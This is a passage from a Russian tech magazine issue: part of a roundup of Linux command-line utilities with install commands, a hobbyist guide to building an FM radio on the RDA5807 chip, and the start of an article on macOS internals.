обновляется в реаль ном времени и реагирует на специаль ные сочетания кла-
виш.





                     Кнопка откры тия терминала

В настройках панели можно поменять и тему. На скрин шоте ниже — тема Neko
Mdui.





Nezha мне очень пон равилась. Рекомен дую как минимум потыкать демо.


AUTOREGEX

Регулярные выражения — мощнейший способ преобразования тек стовых дан -
ных. Однако без опы та составление регулярки может отнять боль ше времени,
чем она сэкономит. Встречай AutoRegex — ИИ-генератор регулярных выраже-
ний из обычных человекочитаемых описаний на английском.





                        Match if email is on gmail

Внут ри у этого сервиса — OpenAI Codex, публичная нейрон ка, которая пишет
код по словесному описанию.
  С простыми запросами AutoRegex справляет ся очень неплохо и позволяет
здорово сэкономить время.
   Единствен ное, что портит жизнь, — это малень кие лимиты на бесплат ное
исполь зование. Впрочем, даже их должно хватить: бесплат но пред лагается
штук десять запросов без аккаунта и еще десять в месяц, если зарегистри-
руешь ся. Для трех скриптов в месяц этого с головой хватит, но при необ-
ходимости можно заплатить или просто зарегать еще одну учет ку и продолжить
поль зовать ся.


HUNT

Hunt — это утилита для локаль ного поиска файлов, аль тернатива стан дартному
locate. Судя по моему опы ту, работает Hunt быстрее, чем nd, fd и locate.
  Написана прог рамма на Rust, а следователь но, ставит ся через Cargo:


cargo install hunt

Здесь есть несколь ко филь тров и простых настроек, которых тем не менее
достаточно для повседневного исполь зования. Вот некоторые из них:
 • -e — искать толь ко объекты с точно совпадающими именами (по запросу
  ssh не будет найден sshd_config );
 • -i /path1,/path2 — исключить из поиска определен ные папки;
 • -h — включить поиск внут ри скры тых папок;
 • -s — не выводить пояснения, толь ко список найден ных файлов. Полезно
   для скриптов;
 • -c — точное совпадение регистра.





Боль ше под робностей — в репозитории прог раммы.


PLOW

Plow пред назначен для наг рузочного тестирования HTTP-серверов. Он осно-
ван на Go-библиотеке fasthttp, которая до десяти раз быстрее стан дартной
реализации, что делает его каким-то аномаль но быстрым, по мень шей мере
субъективно.





                    Тест модуля http.server из Python 3

Plow умеет отдавать статистику в реаль ном времени не толь ко в окне тер-
минала, но и в браузере (по стан дарту встроенный сервер доступен на 18888-
м порте).
  Запуск возможен из Docker или установкой из исходников:


go install github.com/six-ddc/plow@latest


plow <args>

Аль тернатива:


docker run --rm --net=host ghcr.io/six-ddc/plow <args>

Аргумен ты в целом ничего необычного собой не пред ставляют: тут у нас стан -
дартная для таких прог рамм настройка количества потоков (-c), желаемого
количества запросов  (-n), времени теста  ( -d  30s или -d  5m, например)
и HTTP-метода (--method="GET"). Про дру гие парамет ры можно под робно
прочитать в справке прог раммы (--help). Цель передается без специаль ных
парамет ров.


DOOIT

Для ведения списка дел каждый исполь зует что ему удобнее (я, к примеру,
завел приват ный канал в Telegram, в котором есть толь ко я, и шлю все дела
туда). Если ты проживаешь в терминале, графические приложения тебе чужды
и сообщать ком паниям о планиру емых объемах закупки кофе ты не хочешь,
можно исполь зовать локаль ный менед жер задач вроде Dooit . Он хранит все
толь ко у тебя на жестком диске, работает толь ко из терминала и до боли
напоминает Vim, с тем лишь отличием, что последний не зак рывается по Ctrl-
C.





Для установки нужен Git и Python версии не мень ше 3.10, что может быть
проблемой при исполь зовании в некоторых окру жениях. У меня в WSL пос-
ледняя версия Python все еще 3.8, так что для этой прог раммы приш лось рас-
чехлить виртуалку с более свежей системой.
   Если у тебя всё есть, то ставит ся Dooit всего одной коман дой:


python3 -m pip install git+https://github.com/kraanzu/dooit.git

Запускает ся по коман де dooit в терминале.


CONTAINERSSH

Занят ная наход ка — ContainerSSH, позволяющий незамет но загонять SSH-
клиентов в изолирован ные кон тейнеры, причем эти кон тейнеры создают ся
прямо на лету, в момент под ключения.





  Пример от автора утилиты. Поль зователь при под ключении оказывается
  в кон тейнере

Установка очень простая и делается в одну коман ду с исполь зованием Docker
или Kubernetes. Качай содержимое папки-примера и, если у тебя Docker,
выполняй:


docker-compose up -d

А если кубер:


kubectl apply -f kubernetes.yaml

Тестовый сервер будет запущен на 2222-м порте локаль ного хоста и будет
принимать поль зователя foo с любым паролем.
  Исправить это недоразумение можно, написав свой сервер аутен тифика-
ции: это обычный HTTP-сервер с дву мя эндпойнтами (/password и /pubkey),
которые принимают и отдают JSON. Вот пример запроса и ответа в слу чае
аутен тификации по паролю из докумен тации:


{
    "username" : "username" ,
    "remoteAddress" : "127.0.0.1:1234" ,
    "connectionId" : "An opaque ID for the SSH connection" ,
    "passwordBase64" : "Base64-encoded password"
}



{
  "success" : true
}

Выг лядит как отличное решение для изоляции поль зователей (например, гос-
тевые сессии или песочницы для недоверен ных личностей) и проведения вся-
ких соревнований, где клиенты (читай — игроки) должны получать доступ
к одинаковым окру жениям по одинаковым учет ным дан ным, но не должны
иметь возможности что-то сломать или помешать друг дру гу.


CATP

Часто скрипты отправляют промежу точные дан ные в /dev/null. Catp —
это утилита, которая позволяет перехватить такой вывод и вывести его
на экран.





Никакой магии в работе catp нет: внут ри там ptrace, с помощью которого
перехватывается системный вызов write. К сожалению, на боль шинстве сис-
тем это означает, что для работы пот ребу ются права root.
   Установка не требует ся: достаточно скачать последний релиз с GitHub
и запустить распакован ный файл.
   У утилиты есть всего один необязатель ный аргу мент — PID процесса,
который нужно прослушать. Если его не указать, catp перехватит вывод всех
процессов в системе.


                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИАДМИН




                   13 УТИЛИТ ДЛЯ LINUX, КОТОРЫЕ
                          ПРИГОДЯТСЯ АДМИНУ





KRUNVM

Krunvm — это утилита для создания простых виртуалок на основе образов OCI.
Если нужно быстро и лег ко под нимать виртуалки — вещь сложно заменимая.





Krunvm позволяет задавать количество ядер (--cpus) и памяти (--mem) вир-
туаль ной машины. Помимо этого, можно сразу же указать DNS  (--dns),
рабочую папку (--workdir), а так же пробросить порты и каталоги (--port и --
volume соот ветствен но). В общем, доволь но гибкий и простой инстру мент,
если не считать сложности с установкой.
  Ин сталл на голой Ubuntu 22 отнял прилично времени из-за отсутствия инс-
трук ции. Расскажу, как это было, чтобы ты не тратил время.
   Для начала нужен ком пилятор Rust, пакет ный менед жер Cargo и зависи-
мости, которые пот ребу ются при сборке:


sudo apt install rustc cargo patchelf linux-source-5.15.0 libelf-
dev bison flex curl git python3-pyelftools asciidoctor

Затем нужно скачать, ском пилировать и установить libkrunfw:


git clone https://github.com/containers/libkrunfw.git
cd libkrunfw
make
sudo make install

Теперь установи buildah:


sudo apt install buildah

После этого можно скачать и собрать libkrun:


git clone https://github.com/containers/libkrun.git
cd libkrun
make
sudo make install

Финаль ный аккорд — качаем и собираем krunvm:


git clone https://github.com/containers/krunvm.git
cd krunvm
cargo build --release

В target/release будет лежать готовый билд — krunvm. Можно поль зовать -
ся!


ZELLIJ

Zellij — это еще один, притом доволь но интересный, муль типлексор. Если tmux
тебе вдруг станет недостаточно (или просто хочет ся попробовать что-то
новое), то можешь приг лядеть ся к Zellij.





                      Скрин шот из репозитория

Под держивают ся слои, плагины и возможность заранее описать свое окру -
жение. Не пред ставляю, чего тут может не хватить!




                  Дорож ная карта проекта



Для установки можно исполь зовать Cargo или просто скачать и распаковать
бинарный релиз.


cargo install --locked zellij


USBGUARD

Если  ты  не  впервые  откры ваешь  «Хакер»,  то  наверняка  уже  слы шал
про BadUSB и подобные атаки, основан ные на эму ляции легитим ного устрой-
ства ввода при офлайновых атаках. Но если про сам BadUSB знают все, то
встроенная в ядро Linux защита от этого далеко не настоль ко известна.
  Механизм  USB   Device    Authorization   был   добавлен   в   ядро
в далеком 2007 году и принес возможность создавать правила и черно-белые
списки USB-устройств, которым можно и нель зя под ключать ся к кон крет ной
машине.
  Тем  не менее удобного штат ного способа  настройки  этой защиты
до недавних пор не существовало. Теперь у нас есть USBGuard — ком фортный
способ предот вратить атаки с USB на твою линук совую машину.
   Установка относитель но проста. Сначала ставь зависимости:


sudo apt install --no-install-recommends -V \
    asciidoc autoconf automake bash-completion build-essential
catch2 \
    docbook-xml docbook-xsl git ldap-utils libaudit-dev libcap-ng-
dev \
    libdbus-glib-1-dev libldap-dev libpolkit-gobject-1-dev
libprotobuf-dev \
    libqb-dev libseccomp-dev libsodium-dev libtool libxml2-utils \
    libumockdev-dev pkg-config protobuf-compiler sudo tao-pegtl-
dev xsltproc

Затем скачай исходный код из репозитория, перейди в папку с ним и выполни
следующее:


./configure
make
make check
sudo make install

Перед первым запуском нужно сделать некоторую настройку, чтобы не ока-
зать ся без клавиату ры перед собствен ным компь ютером. Сгенерируй набор
правил для разрешения уже под ключен ных устройств:


sudo sh -c 'usbguard generate-policy > /etc/usbguard/rules.conf'

Теперь можно запускать демон.


sudo systemctl start usbguard.service

Если ничего не взорвалось и твоя клавиату ра все еще работает — заряди сер-
вис в автозаг рузку:


sudo systemctl enable usbguard.service


CURL-IMPERSONATE

Известно, что при желании отличить браузер от какой-то тулзы для скачивания
можно по тому, какой имен но трафик они генерируют. Например, curl будет
отличать ся от Chrome, даже если установить нужный заголовок User-Agent.
Происходит это из-за специфического механизма установки шифрован ного
соединения, который можно эксплу атировать для фин герприн тинга.
  Со мной поделились проектом curl-impersonate: это специаль ная сборка
curl, которая умеет прикиды вать ся обычным браузером.
   Утилита будет полезна, например, если работать с TLS-фин герприн тингом.
Либо если просто хочет ся получить пред настроенный для имитации какого-то
браузера curl.
   Для установки можно просто скачать релиз со страницы на GitHub, но перед
этим нужно установить некоторые зависимости:


sudo apt install libnss3 nss-plugin-pem ca-certificates

Для каждого под держиваемого браузера есть скрипт-обертка, который запус-
кает curl-impersonate с нужными парамет рами и заголовками. Таблицу я взял
из репозитория прог раммы.





Запуск на примере Chrome 101:


curl_chrome101 https://xakep.ru


NTFY.SH

Сервис ntfy.sh позволяет удобно отправлять уведом ления на телефон и компь -
ютер прямо из скриптов.
   Чтобы отправить уведом ления, достаточно обычного curl. Пример:


curl \
  -H "Title: XAKEP.RU alert" \
  -H "Priority: high" \
  -H "Tags: heavy_check_mark" \
  -d "Опубликована новая статья\!" \
  ntfy.sh/<your_topic>





                            Резуль тат

Все заголовки необязатель ны, достаточно толь ко дан ных (-d).
  Получать уведом ления на компь ютере можно через браузер — на странице
ntfy.sh/<your_topic>.
   Для получения уведом лений на телефон нужно установить приложение.
Оно есть в Google Play, на F-Droid и в App Store. Устанавливай и под писывай
на свой топик.
  Сервис полностью откры тый, исходники доступны на GitHub. Можно под -
нять свой  self-hosted-экзем пляр, если собираешь ся передавать какие-то
потен циаль но чувствитель ные дан ные. При этом в Android-приложении нужно
взвести галочку Use another server.





JQP

Последним на сегод ня будет jqp (сок ращение от jq playground) — это красивая
TUI-песочница для обу чения исполь зованию jq.
  Про сам jq мы уже писали в «Хакере», так что повторять ся не буду. А вот
про такой классный интерфейс к нему нужно рассказать под робнее.
  Он под держивает ввод из файла (параметр -f) или из стан дартного потока
ввода (curl https://url/to/your.json | jqp). В верхней части кон соли
есть поле для ввода запроса к jq, в левой колон ке отображаются ввод ные дан -
ные (JSON из файла или из stdin), в правой — вывод jq на введен ный запрос.
Нажатием Tab можно перек лючать ся между этими полями, стрелочками —
пролистывать вверх и вниз.





                  Выбрать все поля timestamp

В репозитории прог раммы есть информация о горячих клавишах, но для ком -
фортного исполь зования jqp их знать необязатель но.
   Чтобы установить jqp, просто скачай и разархивируй бинарный релиз. После
этого его удобно поместить в /usr/local/bin:


mv ./jqp /usr/local/bin


ÏÐÈÑÛËÀÉ ÑÂÎÈ ÏÎÆÅËÀÍÈß!

Чем даль ше, тем боль ше я понимаю TUI-мань яков, которым не нужны кра-
сивые окош ки и достаточно терминала. Если ты из таких, то наверняка тоже
накопил немалый арсенал малоизвестных утилит, о которых я еще не писал.
Не стесняйся, рассказывай о своих любимых инстру мен тах в ком ментариях
под этой стать ей, и я добавлю их в следующую под борку.
GEEK





                          ДЕЛАЕМ
                  РАДИОПРИЕМНИК
                     НА КОПЕЕЧНОМ
                  КИТАЙСКОМ ЧИПЕ




В этой статье я покажу, как самому соб-
рать простой, но качествен ный FM-ради -
опри емник на осно ве свер хдешево го чипа
RDA5807FP. Наш гад жет будет выдавать
качествен ный  стереоз вук,  у него  будут            Candidum                                                                                          duospirit@gmail.com
кноп ки для настрой ки, квар цевая ста били -
зация частоты и про чие при ятные фичи.
Если ты лишь недав но взял в руки паяль-
ник, то эта инструк ция для тебя.


RDA5807

В предыду щих стать ях я показы вал, как собирать разные FM-приемники, одна-
ко начинающим радиолюбителям было сложно и собирать их, и настраивать.
Даже сверхрегенератор, исключитель но простой с точки зрения схемотехники,
весь ма нет ривиален в настройке, нестабилен в работе и зву чит посредствен -
но. Сегод ня у нас будет простой, но гораздо более прод винутый проект.
  Мик росхему RDA5807FP я уже упоминал в статье о SI4734 . Теперь мы рас-
смот рим ее под робнее. Это однокристаль ный SDR-приемник, под держи-
вающий RDS, но об этом как-нибудь в дру гой раз. Взглянем на струк турную
схему.





                     Струк турная схема RDA5807FP

Здесь  лег ко  узнать  типичный SDR-приемник.  Вход ной  сиг нал  (обычно
из антенны) поступает на УВЧ, затем на квад ратурный смеситель, отту да
в виде двух сиг налов  I и Q на УПЧ, даль ше на АЦП, после чего в цифровом
виде обрабаты вает ся DSP-процессором. В нем стереосиг нал демоду лиру ется
и декодирует ся. Затем декодирован ный сиг нал поступает на ЦАП, где пре-
образует ся в аналоговый зву ковой стереосиг нал.
   Гетеродин  пред ставляет  собой  PLL-син тезатор  с  опорной   час-
тотой 32 768 Гц (часовой кварц, но возможны и дру гие частоты), управление
частотой прог рам мное, минималь ный шаг перестройки — 25 кГц.


ÖÈÔÐÎÂÀß ÄÅÌÎÄÓËßÖÈß

В статье о ZetaSDR я уже показы вал, как детек тировать сиг налы AM и SSB,
теперь рассмот рим ЧМ.
   Итак, на выходе АЦП мы имеем сиг налы  I и Q, тог да искомый модули-
рующий сиг нал будет равен


S=arctan(I/Q)'=(IQ'-QI')/(I^2+Q^2)

Причем если в исходном сиг нале хорошо подавлена амплитуд ная модуляция,
то знаменатель можно опустить, так как он пред ставляет собой кон стан ту. Что
же касается поиска производных, то их фун кцию с успехом выполняют конеч-
ные разности:


X(i)'=X(i+1)-X(i-1)


ÊÎÄÈÐÎÂÀÍÈÅ ÑÒÅÐÅÎ

Хорошо, с демоду ляцией разобрались, а что насчет стерео? Сейчас исполь -
зует ся кодирование сиг нала CCIR. Сог ласно этому стан дарту, спектр сиг нала
имеет следующий вид.





                Спектр демоду лирован ного FM-сиг нала

В низкочастотной части спек тра располагается сум ма правого и левого
каналов, что обеспечивает обратную совместимость с монофоническими при-
емниками. Например, сверхгенератор, о котором я писал ранее, как раз
выделяет эту сум му.
  Далее вок руг частоты 38 кГц идет разность левого и правого каналов —
это амплитуд ная модуляция с подавленной несущей (DSB-модуляция). Подав-
ление несущей позволяет сузить спектр передат чика, что повышает КПД
передачи.
  Од нако для детек тирования сиг нала DSB нужно восстановить несущую
с точностью до фазы. Для этого передается так называемый pilot tone 19 кГц
(половина несущей частоты 38 кГц), собствен но, по наличию пилот-тона при-
емники и определяют, что передача содержит стереосиг нал.




                      •Что такое синхронный детектор? (RxLab)
                    •Синхронный АМ-при емник Полякова


Несущую обычно  получают  син хронизацией дополнитель ного  гетеродина
на 38 кГц с пилот-тоном или удвоением его частоты. В DSP для удвоения час-
тоты исполь зует ся возведение в квад рат.
   Сиг нал DSB детек тиру ет син хрон ный детек тор, фак тически это техника пря-
мого преобразования с исполь зованием восстановленной несущей. А уже
имея сум му и разность каналов, можно выделить сиг налы левого канала и пра-
вого:


( L+R ) + ( L-R )= 2L
( L+R ) - ( L-R )= 2R

В GNU Radio разверну тый цифровой тракт ЧМ-приемника выг лядит монстру -
озно. Правда, там еще и декодер RDS, который мы сегод ня не рассмат рива-
ем.





                    SDR-тракт ЧМ-стереоприем ника

Внут ри RDA5807 это все, вероятно, лучше оптимизировано, но общий прин -
цип, несом ненно, тот же.


ÏÐÀÊÒÈÊÀ

Здесь должно быть описание интерфейса I2C RDA5807, инициализация, уста-
новка частоты, настройка гром кости и так далее, но об этом в дру гой раз. Дело
в том, что некоторое время назад мне на глаза попалась интересная схем ка —
творение сум рачного китайского гения.





                       Исходная схема

Как лег ко видеть, никакого мик рокон троллера здесь нет, а управление выпол-
няет ся кнопками К1–К5, К1 — включить/вык лючить, К2 — повысить гром кость,
К3 — умень шить гром кость, К4 — предыду щая настройка, К5 — следующая
настройка. Выг лядела схема подозритель но, учитывая, что в даташите не было
ни слова про режим stand alone. Сравнение со схемой из даташита толь ко уси-
лило сом нения.





                        Схема из даташита

На схеме вид но, что кнопки под ключены к выводам GPIO1–3 (это вполне прав-
доподобно), еще две — к линиям SDA и SCL (такое тоже сойдет), а вот шестой
вывод мик росхемы помечен как GND, тог да как в китайском варианте под тянут
к плюсу питания. Выг лядело это крайне сом нитель но, да еще это дурацкое
сум мирование каналов кон денсаторами... Обычно мик росхемы при попыт ке
подать плюс на вывод GND испускают волшебный дым и перестают работать.
Такое я наблюдал неод нократ но!




                       Как всем извес тно, электроника работа ет на вол -
                    шебном дыме и, как только этот дым вырыва ется
                        наружу, устрой ство перес тает работать.


Но так как схема была чересчур простой, сама RDA5807FP стоила всего 8 руб-
лей (сейчас 12) и таких мик росхем у меня был неболь шой запас, я решил рис-
кнуть. Для пробы я спаял все это дело «летучкой», то есть без всяких плат —
просто соединил детали проводами.





                        Ленивый макет

Подал на эту шту ку 3,3 В в ожидании волшебного дыма, но ничего не про-
изош ло.  Более   того,  после  под ключения  науш ников  и  замыкания
GPIO1 на зем лю (кнопки включения на макете нет) в науш никах раздалось
шипение, а после нажатия кнопки настройки приемник успешно захватил стан -
цию. Дело за малым — развести неболь шую плат ку. Но сначала нем ного изме-
ним схему, посколь ку диоды на входе излишни: сог ласно даташиту, они уже
встроены во вход ную цепь.





                       Вход ные цепи RDA5807

А вот кон тур, пожалуй, можно оставить, шту ка полезная, хотя и без него все
будет работать. Резистор в цепи кнопки включения тоже можно убрать. Да и
УЗЧ не нужен, так как мощности RDA5807 с лихвой хватает для стан дар-
тных 32 Ом науш ников. В итоге получаем вот такую схему.





                 Финаль ный вариант схемы




                    Вмес то   RDA5807SP   мож но   использовать
                    RDA5807FP (доработанная версия RDA5807SP)
                      и HEX3653. Более того, на «Али экс прес се» пред -
                        лага ют наборы для сборки очень похожей схемы
                        с  пла той  и  всеми  деталя ми —  обой дет ся
                       это дешевле 100 руб лей.


А вот и плата под нее.





                        Печат ная плата

В сборе это выг лядит так.





                       Приемник в сборе

В качестве антенны исполь зует ся кусок провода длиной примерно 75 см.


ÐÅÇÓËÜÒÀÒÛ

По соот ношению простота/качество и цена/качество этот приемник уделывает
все, что я ког да-либо собирал. Качество зву чания на уровне типичных промыш -
ленных образцов, схемотехника проще сверхрегенератора и совершенно
не нуждает ся в настройке.
  Приемник работает в диапазоне 87–108 МГц, при вык лючении стан ция,
на которую он настроен, сохраняется в памяти. Нажатие на кнопку настройки
запускает сканирование вверх или вниз по частоте, при достижении границы
диапазона сканирование начинается с дру гого кон ца. Чувствитель ность у при-
емника неплохая, но усту пает SI4734.


ÍÅÄÎÑÒÀÒÊÈ

Недостатки, как известно, — это продолжение достоинств, и у нас тот самый
слу чай. Расплата за простоту и отсутствие кон троллера — невозможность тон -
кой настройки и исполь зования всех фун кций RDA5807. Отсутству ет индикация
частоты, на которую настроен приемник, нет возможности исполь зовать RDS,
и не получит ся настроить ся на частоты ниже 87,5 МГц. Правда, там стан ций
всего несколь ко штук, да и те дублиру ются в диапазоне 87,5–108 МГц. Но в
целом это все мелочи.


×ÒÎ ÌÎÆÍÎ ÓËÓ×ØÈÒÜ

Улучшать тут по боль шому счету почти нечего, разве что добавить неболь шой
кон денсатор параллель но кнопке включения — это поможет устранить дре-
безг. Ну и к питанию неплохо бы для поряд ка добавить кон денсатор. Можно
еще поставить УЗЧ на выход, если недостаточно науш ников, или прик рутить
однокаскадный УВЧ на вход, чтобы под нять чувствитель ность (хотя особого
резона я в этом не вижу).


ÂÛÂÎÄÛ

Ду маю, я дал тебе достаточно пищи для размышлений и идею для несложного
проекта. Если захочешь похвастать ся перед знакомы ми, что ты настоящий
радиолюбитель, то лучше не придумать.
GEEK





         РАЗБИРАЕМ В ПОДРОБНОСТЯХ,
                  КАК УСТРОЕНА MACOS




Пред положим, ты недав но при обрел «мак»
или раз думыва ешь, не сделать ли  это.
Но macOS кажет ся чуждой и непонят ной,
да и вообще ходят слу хи о том, что там
чихнуть нельзя без раз решения Тима Кука.       Андрей Письменный                                                                                      Главный редактор
Дру гая распростра нен ная небыли ца — что         apismenny@gmail.com
macOS всего лишь чуть-чуть переделан -
ный Linux. В этой статье мы прой дем ся
по всем основным механиз мам macOS
и заод но погово рим о том, какие в реаль-
ности есть огра ничения и можно ли их
обой ти.


ÊÐÀÒÊÀß ÈÑÒÎÐÈß MACOS

История macOS, как и в целом история Apple, увлекатель на и полна захватыва-
ющих перипетий. Здесь я перескажу ее в очень сок ращен ном и упрощен ном
виде.
  Все началось в далекие вось мидесятые годы с компь ютеров Apple II. Опе-
рационной системы в современ ном понимании этого слова у них, по сути,
не было: сейчас их ОС мы бы назвали прошивкой. Как и в слу чае с дру гими
домаш ними компь ютерами той эпохи, в нее входил интерпретатор BASIC, слу -
живший для выполнения поль зователь ских команд.




                    Ни какого  замет ного  нас ледия  Apple   II  и   III
                        в macOS сей час не най ти, одна ко жела ющие при -
                         кос нуться к истории могут запус тить эму лятор
                         Apple II пря мо в бра узере.


Компь ютер Apple Macintosh, вышед ший на рынок в 1984 году, разитель но
отличался от этих машин. Его операционная система сразу включала в себя
графический поль зователь ский интерфейс с под держкой мыши. Окон ный
интерфейс по тем временам считался удивитель ной новин кой — до этого его
не  было  ни  у  одного  серийно  производимого  компь ютера  (Windows
1.0 появился через два года после Macintosh и многое у него позаимствовал).





                Од на из первых версий Mac OS

Классическая Mac OS активно развивалась до 1996 года, а последний ее
релиз вышел в 2001 году. И если для кон ца вось мидесятых она считалась
передовой, то в девяностые ее архитек тура с устаревшей моделью разделения
памяти постепен но стала прег радой для развития Apple. В качестве экстрен -
ной меры руководство ком пании решило приобрести стартап NeXT, основан -
ный ранее вытесненным из Apple Стивом Джобсом.





          Mac OS 9 — последний боль шой релиз «классики»

Главной  разработ кой  NeXT  была  графическая  операционная  система
NeXTSTEP, в основе которой — Unix-образное ядро и окру жение, прод винутый
графический движок и набор объектно ориентирован ных фреймворков. Пос-
ледний  позволял  разработ чикам  лег ко  создавать  окон ные  приложения
на прод винутом по тем временам язы ке Objective-C. На компь ютерах NeXT,
к примеру, был создан прототип первого веб-браузера.





                           NeXTSTEP

После того как коман да разработ чиков NeXT переш ла в Apple, совместны ми
усилиями была создана новая система — Mac OS X. Позднее ее переименова-
ли в OS X, а затем в macOS (отдел маркетин га в Apple никог да не сидит сложа
руки). Технически Mac OS X основана на NeXTSTEP, однако ее интерфейс мно-
гое почерпнул из классической Mac OS.





                    Mac OS X 10.1 Cheetah

В переход ный период «макин тоши» под держивали как классическую Mac OS,
так и Mac OS X. С 2002 года все компь ютеры Apple стали выходить с предус-
тановленной Mac OS X, а Mac OS 9 еще несколь ко лет можно было запускать
в режиме совместимости.


ßÄÐÎ XNU

В основе macOS, как и в основе любой дру гой ОС, лежит ядро. Оно отвечает
за выделение процессорного времени, управление оперативной памятью
и кешем, взаимодействие с устройствами и сетью. В то же время оно обра-
баты вает системные вызовы приложений и обеспечивает взаимодействие про-
цессов.
  Современ ная macOS работает на ядре XNU, которое приш ло из NeXTSTEP.
За основу его кода в свое время был взят проект Match — ответ вление от ядра
FreeBSD.
  XNU означает X is Not Unix, «X — не Unix». Эта расшифровка — давно уте-
рявший акту аль ность прог раммист ский юмор: macOS все же по боль шому сче-
ту считает ся одной из разновид ностей Unix. Однако XNU не имеет бинарной
совместимости с FreeBSD, то есть прог раммы для FreeBSD в macOS нель зя
запустить без изменений и переком пиляции.
  Яд ро XNU — гибридное. Это значит, что в отличие от мик роядер оно может
быть дополнено расширениями, но при этом не является монолит ным,
как ядро Linux, где все фун кции собраны в один гигант ский бинарный файл.
  До macOS 10.15 основным способом расширения ядра были модули kext.
Посколь ку «кек сты» работают в пространстве ядра, сбои в них могут приводить
к нестабиль ной работе компь ютера. К тому же они откры вали боль шие воз-
можности для недобросовестных разработ чиков.
  Сейчас «кек сты» считают ся устаревшим методом, и со временем он будет
отключен. Вместо этого в Apple пред лагают разработ чикам исполь зовать
фреймворки DriverKit и SystemExtension, которые позволяют создавать драй-
веры и расширения, работающие в пространстве поль зователя.





                       Архитек тура macOS


DARWIN

Операционная система — это не толь ко ядро. Вместе с Match в NeXTSTEP,
а затем и в Mac OS X перекочевал набор библиотек и исполняемых файлов,
которые вместе с XNU обеспечивают под держку POSIX — Portable Operating
System   Interface,  «портиру емого  интерфейса  операционной  системы».
Это стан дарт, которому в той или иной мере соот ветству ют все Unix-образные
операционные системы и который обеспечивает низкоуровневую совмести-
мость между ними.
  В macOS этот слой называется Darwin и по сути пред ставляет собой самос-
тоятель ную операционную систему. Сюда не входят графическая среда и биб-
лиотеки, нужные для работы окон ных приложений, но входят ядро, драйверы,
сетевой стек, набор системных и поль зователь ских утилит коман дной строки,
а так же система запуска служб и приложений launchd.
  При желании Darwin можно установить как самостоятель ную минималис-
тичную ОС с тек стовым интерпретатором команд. Код Darwin с самого начала
был открыт, однако со временем в нем появилось множество зак рытых ком -
понен тов, включая специфичные для «маков» драйверы.
  Последние версии Darwin уже было невозможно собрать и заставить
работать без средств, доступных толь ко прог раммистам Apple. Получилось,
что публикация исходников в таком виде стала не нужна ни Apple, ни сообщес-
тву, и ее просто прек ратили. Код XNU тем временем по-прежнему доступен
на GitHub и продолжает обновлять ся.
  Сейчас силами сообщества под держивает ся проект PureDarwin — по-нас-
тоящему откры тая реализация Darwin.




                    Дол гое время среди прод винутых маководов был
                       популя рен набор ути лит MacPorts, также осно-
                       ванный на Darwin, но допол ненный и рас ширен-
                     ный современными версиями прог рамм для Linux.
                       MacPorts  продол жают  под держи вать,  одна ко
                      сей час его поч ти пол ностью вытес нил пакет ный
                     менед жер brew.



ÃÐÀÔÈ×ÅÑÊÀß ÑÈÑÒÅÌÀ

Графический слой в macOS обычно называют Quartz, хотя под разумевает ся
под этим набор библиотек Core Graphics. Две его важнейшие части —
это Quartz 2D и Quartz Compositor.


Quartz 2D
Quartz 2D отвечает за все, что связано с дву мерной графикой. В его основные
задачи входит отрисовка тек ста и превращение графических примитивов, опи-
сан ных в формате  PostScript, в растровые изображения, которые затем
передаются в Quartz Compositor.
  Формат PostScript изначаль но был разработан в ком пании Adobe и пред -
назначался для вывода докумен тов на печать. Так же PostScript лег в основу
формата PDF  и, что важно для нас, исполь зовался в компь ютерах NeXT
для описания выводимой на экран графики. Отту да он и пришел в macOS. Бла-
годаря такому близкому родству PostScript и PDF «маки» и айфоны прек расно
справляют ся с отображением PDF без установки Adobe Acrobat или дру гого
просмот рщика.


Quartz Compositor
Quartz Compositor одновремен но играет роль графического сервера и ком -
позит ного окон ного менед жера. С одной стороны, он получает от приложений
растровые изображения их окон и собирает из них картинку для отображения
на экране (это и есть ком позиция), с дру гой — обрабаты вает события, связан -
ные с устройствами ввода: клики мышью и нажатия на кнопки клавиату ры.
Quartz Compositor определяет, к какому окну относят ся события, и пересы лает
их соот ветству ющим приложениям.





Посколь ку Quartz Compositor — это еще и окон ный менед жер, в его задачи
входит отрисовка поль зователь ского интерфейса. Это шрифты, меню, рам ки
окон, панели и прочие вид жеты, которые коллективно называются интерфей-
сом Aqua. В ран них версиях Mac OS X некоторые его элемен ты действитель но
походили на капли воды, но с тех пор дизайн многок ратно меняли, и теперь
это просто название.




Не стоит путать Quartz Compositor со средством разработ ки, которое называ-
ется Quartz Composer. Composer — это визу аль ный язык прог раммирования
в составе IDE Xcode, который позволяет из готовых блоков собирать сложные
преобразования для изображений и видео. Имен но в этом кон тек сте слово
Quartz иног да попадается в графических редак торах, которые позволяют нап-
рямую исполь зовать возможности Quartz Composer.



XQuartz
Если порыть ся в средствах разработ ки для macOS, то можно откопать
еще один интересный артефакт — XQuartz. Это реализация окон ного сервера
XWindow из Unix. Долгое время его свобод ная реализация X.Org входила в каж-
дый дистрибутив Linux и была стан дартом де-фак то. Сейчас старые и не очень
добрые «иксы» постепен но заменяют системами вроде Wayland и Mir, в чем-то
схожими по устройству с маковским Quartz Compositor.





                                 XQuartz

Что до XQuartz, то он явно создавался в Apple с мыслью, что неплохо бы иметь
возможность запускать графические приложения для Unix и Linux. Однако нуж-
да в этом оказалась не так велика, и никакого развития XQuartz не получил.
В Linux боль шинство графических прог рамм опирает ся на библиотеки сред
Gnome и KDE, а их портирование на «мак» в планы Apple не входило. В итоге
XQuartz может пригодить ся толь ко для самых простых графических прог рамм,
которые общаются с XWindow напрямую.


APFS

До выхода macOS 10.13  High  Sierra файловой системой по умолчанию
на любом «маке» была HFS+, унаследован ная еще от классической Mac OS.
В свое время она считалась передовой — у HFS+, к примеру, есть под держка
Unicode и журналирования (журнал ФС — история операций, которая помогает
сохранить целостность дан ных в слу чае сбоя или отключения питания). Однако
исходная HFS проектировалась еще в вось мидесятых годах  и, несмотря
на апгрейд до HFS+ в кон це девяностых, не под держивала многие важные
новшества.
  В Apple разработали и в 2017 году успешно внед рили в iOS новую фай-
ловую систему, названную APFS — Apple File System. Она обладает множес-
твом достоинств, которые приш лись кстати не толь ко на айфонах и айпадах,
но и на «маке».
  APFS изначаль но спроектирована с учетом исполь зования твердотель ных
накопителей (SSD), в частности под держивает коман ду TRIM. Так же она может
адресовать файлы с исполь зованием 64-разрядных иден тификаторов (вмес-
то 32-разрядных в HFS+), под держивает разрежен ные файлы (если файл пус-
той, система не занимает пространство нулями, а сжимает их), может шиф-
ровать дан ные на уровне файлов и каталогов (а не толь ко весь диск) и поз-
